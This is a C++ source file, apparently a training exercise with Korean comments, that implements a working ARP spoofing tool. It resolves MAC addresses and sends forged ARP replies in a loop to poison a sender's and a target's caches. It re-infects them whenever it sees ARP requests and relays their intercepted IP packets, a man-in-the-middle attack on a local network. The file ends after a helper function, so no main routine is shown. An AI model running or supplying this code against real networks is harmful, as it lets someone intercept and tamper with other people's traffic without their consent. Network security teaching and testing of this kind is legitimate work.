#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <utility>
#include <map>
#include <algorithm>
#include "ethhdr.h"
#include "arphdr.h"
#include <time.h>
// thread
#include <thread>
#include <signal.h>
// getMyIp
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
//
#include "common-threads.h"
#define SUCCESS 1
#define FAIL -1
#define DEBUG 1


#pragma pack(push, 1) 
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;

	// 복사 생성자
	EthArpPacket() {}
	EthArpPacket(const EthArpPacket& r) { memcpy(&(this->eth_), &(r.eth_), sizeof(EthArpPacket)); }
	
	// 복사 대입 연산자
	EthArpPacket& operator=(const EthArpPacket &r) {
        memcpy(&(this->eth_), &(r.eth_), sizeof(EthArpPacket));
        return *this;
    }
};
#pragma pack(pop)

using std::cout;
using std::ifstream;
using std::string;
using std::cerr;
using std::pair;
using std::vector;
using std::map;
using std::endl;

int exit_flag = 1;
std::vector <EthArpPacket> infectionPacket; // IpTable하고 매칭되도록 index 구성


void sigint_handler(int signo) {
	printf("sigint!!\n");
	exit_flag = 0;
}

void usage() {
	cout << "syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << endl;
	cout << "sample : arp-spoof wlan0 192.168.10.2 192.168.10.1" << endl;
}

Mac getMyMac(char* dev) {
	//cout << "ttest" << endl;
	// 리눅스의 경우
	// /sys/class/net/[dev]/address
	ifstream fin;
	string path = "/sys/class/net/" + string(dev) +"/address";
	fin.open(path);

	if (fin.fail()) {
		cerr << "Error: " << strerror(errno);
		return Mac::nullMac(); // FAIL이면 null 맥 리턴
		//return FAIL;
	}

	string tmp;
	fin >> tmp;
	fin.close();

	return Mac(tmp);
	//return SUCCESS;
}

EthArpPacket fillPacket(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, Ip& tip, uint16_t type) {
	EthArpPacket packet;
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac1;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(type);
	packet.arp_.smac_ = smac2;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	return packet;
}

void sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t usec) {
	// 쓰레드 취소 요청에 대한 처리
	//pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
	//pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS,NULL);

	for(int i = 0; i < times; i++) {
		// critical section??
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		//

		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s times=%d\n", res, pcap_geterr(handle), times);
			return;
		}

		usleep(usec); // 마지막에는 필요 없는데 어케 해결할까 1. if  2. ??
	}
	return;
}

int resolveMac(pcap_t* handle, map<Ip, Mac>& table, Ip& sip, Ip& tip) {
	// table에 있는지 확인
	if(table.find(tip) != table.end()) return SUCCESS;


	EthArpPacket send_packet = fillPacket(table.find(sip)->second, Mac::broadcastMac(), table.find(sip)->second, sip, Mac::nullMac(), tip, ArpHdr::Request);
	// 1초에 1번씩 전송하도록 함 
	// 10초 지나고 타임 아웃
	
	struct pcap_pkthdr* pkheader;
	const u_char* packet;

	// 타이머 구현하는 법
	// 1. 시작 시각하고 현재 시각의 차이를 구한다 -> sleep_for 내부도 이렇게 작동함 ㅋㅋ
	time_t startTime, endTime, counter;
	time(&startTime);
	time(&counter);
	sendARP(send_packet, handle, 1, 0);

	while (1) {
		time(&endTime);

		if(endTime - counter > 1) {
			sendARP(send_packet, handle, 1, 0);
			time(&counter);
		}

		if(endTime-startTime > 10) {
			cout << "timeout:: cannot receive reply packet" << endl;
			return FAIL;
		}

		int res = pcap_next_ex(handle, &pkheader, &packet);
		
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return FAIL;
		}
		
		// ETH-ARP 패킷인지 확인하고 
		EthArpPacket receive_packet;
		memcpy(&receive_packet, packet, 42);
	
		// => ETH의 type정보를 확인
		if(receive_packet.eth_.type_ != htons(EthHdr::Arp)) continue;

		// reply 패킷인지 확인
		if(receive_packet.arp_.op_ != htons(ArpHdr::Reply)) continue;

		// send를 바탕으로 send에 대한 reply인지 확인
		if(send_packet.eth_.smac_ != receive_packet.eth_.dmac_) continue;
		if(send_packet.arp_.smac_ != receive_packet.arp_.tmac_) continue;
		if(send_packet.arp_.sip_ != receive_packet.arp_.tip_) continue;
		if(send_packet.arp_.tip_ != receive_packet.arp_.sip_) continue;

		table.insert({ntohl(receive_packet.arp_.sip_), receive_packet.arp_.smac_});
		break;
	}
	#ifdef DEBUG
	cout << "resolve end" << endl;
	#endif
	return SUCCESS;
}

Ip getMyIp(char* dev) {
	int fd;
    struct ifreq ifr;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    ifr.ifr_addr.sa_family = AF_INET;
   	strncpy(ifr.ifr_name, dev, IFNAMSIZ -1);
    
   	ioctl(fd, SIOCGIFADDR, &ifr);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    close(fd);
     
    return Ip(ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr));
}

int getMyInfo(char* dev, map<Ip, Mac>& table) {
	Mac myMac = getMyMac(dev);
	if(myMac == Mac::nullMac()) return FAIL;
	table.insert({getMyIp(dev), myMac});
	return SUCCESS;
}

void recover(pcap_t* handle, map<Ip, Mac> table, Ip sender, Ip target) {
	sendARP(fillPacket(table[target], table[sender], table[target], target, table[sender], sender, ArpHdr::Reply), handle, 3, 500);
}

// 쓰레드용
void *infection(void* handle) {
	while(exit_flag) {
		for(auto i : infectionPacket) {
			sendARP(i, (pcap_t *)handle , 1, 0);
			sleep(1); // packet loss? 때문에
		}
	}
}

// infection 시켰으면 계속 감시해야 함.
// while문으로 돌려놓고 변수로 종료시키자
// 쓰레드
void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& IpTable, Ip& me) {
	#ifdef DEBUG
	cout << "watch!" << endl;
	#endif
	struct pcap_pkthdr* pkheader;
	const u_char* packet;
	// relay용
	u_char paste_packet[10000]; // 동적할당으로 수정 ㄱㄱ

	while (exit_flag) {
	
		// critical section
		int res = pcap_next_ex(handle, &pkheader, &packet);
		//
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return;
		}

		EthHdr ethHeader;
		memcpy(&ethHeader, packet, 42);
	
		// IP 패킷인지 ARP인지
		// => ETH의 type정보를 확인
		if(ethHeader.type_ == htons(EthHdr::Ip4)) {
			//cout << string(header.eth_.smac_) << ' ' << string(header.eth_.dmac_) << endl;
			// flow를 해야하는지 확인

			// IP헤더에서 sip랑 dip만 필요함.
			Ip sip, dip;
			
			memcpy(&sip, &packet[14+12], 4);
			memcpy(&dip, &packet[14+16], 4);


			// flow하는 것은
			// smac은 sender
			// dmac은 나 
			// dip는 target => 외부일거임
			// 만약에 ip도착지가 나이면 relay할 필요 없음.



			for(auto i : IpTable) {
				// smac이 sender인지
				if(ethHeader.smac_ == ARPtable[i.first] && ethHeader.dmac_ == ARPtable[me]) {
					//cout << "진입" << endl;
					if(pkheader->len >= 10000) {
						cout << "length 초과" << endl;
						continue;
					}

					
					// case 1: 내 자신(본인이 target일 경우)한테 오는 패킷을 나한테 또 전달할 필요는 없음.
					// continue하면 될듯
					//if(i.second == me) continue; // 내가 target
					//if(htonl(dip) == me) continue; // 패킷 dest ip가 나
					
					// case 2: {sender, target}의 중복
					// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.7 192.168.0.1 192.168.0.7
					// resolve에서 해결했음.

					// case 3: sender == target 인 경우 
					// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.1
					// ????

					// case 4: sender가 중복 될수도 target이 중복될 수도 있음
					// relay 이후에 break하지 말고 continue해야 함. -> 이미 구현되어 있음

					// case 5: sender가 me인 경우
					// 본인이 이미 감염되어 있기 때문에 패킷을 target한테 보냄.
					// relay할 필요가 없음.
					// ???
					//if(i.first == me) continue;

					// case 6: 
					// ex)  /arp-spoof A B B A A C C A
					/*

					패킷 relay는
					A <-> me <-> B(gateway)
					A <-> me <-> C(user) // 이러면 ip로 판단해야할듯
					*/


					// relay할 때는

					// src mac me로 바꿔서 보냄
					// dst mac 을 target꺼로
					memcpy(paste_packet, packet, pkheader->len);
					Mac myMac = ARPtable[me];
					memcpy(&paste_packet[6], &myMac, 6);
					Mac tMac = ARPtable[i.second];
					memcpy(paste_packet, &tMac, 6);



					// critical section
					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&paste_packet), pkheader->len);
					//

					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s len=%d\n", res, pcap_geterr(handle), pkheader->len);
						return;
						//return FAIL;
					}
					//cout << "relay" << endl;
					break;
				}
			}
			continue;
		}
		
		if(ethHeader.type_ != htons(EthHdr::Arp)) continue;


		EthArpPacket header;
		memcpy(&header, packet, sizeof(EthArpPacket));


 
		// case 1: target이 본인이면
		// arp 감염할 필요가 없다.
					
		// case 2: {sender, target}의 중복
		// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.7 192.168.0.1 192.168.0.7
		// resolve에서 해결했음.

		// case 3: sender == target 인 경우 
		// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.1
		// ???? 공격이 의미가 있을까?
		// 본인 mac주소는 ARP Table을 이용하는지? => 일단은 아닌거 같음

		// case 4: sender가 중복 될수도 target이 중복될 수도 있음
		// relay 이후에 break하지 말고 continue해야 함. -> 이미 구현되어 있음

		// case 5: sender가 me인 경우
		// 본인이 이미 감염되어 있기 때문에 패킷을 target한테 보냄.
		// ex) ./arp-spoof enp0s3 192.168.0.7 192.168.0.1
		// 본인의 ARP table을 본인에게 망가트리도록 조정함
		// 의미가 잇을까?

		// case 6: 
		// ex) 


		// network byte order <-> host byte order
		cout << "this packet is ARP" << endl;
		// broadcast인지 
		cout << ntohl(header.arp_.sip_) << ' ' << ntohl(header.arp_.tip_) << endl;
		if(header.eth_.dmac_ == Mac::broadcastMac()) {
			for(int i = 0; i < IpTable.size(); i++) {
				// 1. sender의 target에 대한 broadcast
				if(ntohl(header.arp_.sip_) == uint32_t(IpTable[i].first) && ntohl(header.arp_.tip_) == uint32_t(IpTable[i].second)) {
					cout << "case 1" << endl;
					sendARP(infectionPacket[i], handle, 2, 500);
				}

				// 2. target의 broadcast
				if(ntohl(header.arp_.sip_) == uint32_t(IpTable[i].second)) {
					cout << "case 2" << endl;
					sendARP(infectionPacket[i], handle, 2, 500);
				}
			}

		}
		// unicast인지
		else {
			for(int i = 0 ; i < IpTable.size(); i++) {
				// 3. sender -> target unicast
				if(header.arp_.sip_ == IpTable[i].first && header.arp_.tip_ == IpTable[i].second) {
					cout << "case 3" << endl;
					sendARP(infectionPacket[i], handle, 2, 500);
				}
			}
			
		}

		// 4. target -> sender unicast => 인자를 2쌍 이상 받아서 처리하는 이유
		// target sender 둘다 감염 시키면 
		// 4에 해당하는 것이 3번 경우에 잡힙
		// 어차피 arp는 relay하지 않기 때문에 sender한테 unicast 전달이 안됨.
	}
}

void initArg(char* argv[], Ip& sender, Ip& target) {
	sender = Ip(string(argv[0]));
	target = Ip(string(argv[1]));
}

